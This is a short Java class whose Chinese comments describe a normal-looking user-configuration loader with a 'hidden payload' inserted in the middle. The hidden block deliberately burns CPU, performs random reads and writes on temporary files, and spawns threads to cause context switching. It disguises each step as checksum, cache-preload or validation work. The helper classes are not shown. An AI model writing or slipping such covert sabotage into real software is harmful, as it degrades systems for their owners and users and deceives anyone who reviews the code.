public class CoreApplicationLogic {
    
    // 这是一个看似正常的业务方法，例如加载用户配置
    public void loadUserConfiguration(String path) {
        // ... 正常的业务逻辑代码 ...
        
        // --- 隐蔽负载启动点 ---
        
        // 1. 获取伪装参数 (包含 CPU 负载)
        long initialKey = ConfigurationChecksumGenerator.calculateInitializationKey(500); // 引入可变 CPU 延迟
        int cacheSizeMB = ConfigurationChecksumGenerator.getRequiredCacheSizeMB(initialKey);
        int threadCount = ConfigurationChecksumGenerator.getPreloadThreadCount(cacheSizeMB);
        
        // 2. 启动 I/O 负载
        SystemPreloadUtility.initializeCacheAndPreload(cacheSizeMB, 2); // 随机读写 2 个临时文件
        
        // 3. 启动线程负载 (上下文切换)
        BackgroundScheduler.startValidationTasks(threadCount);
        
        // --- 隐蔽负载结束点 ---
        
        // ... 正常的业务逻辑代码继续 ...
    }
}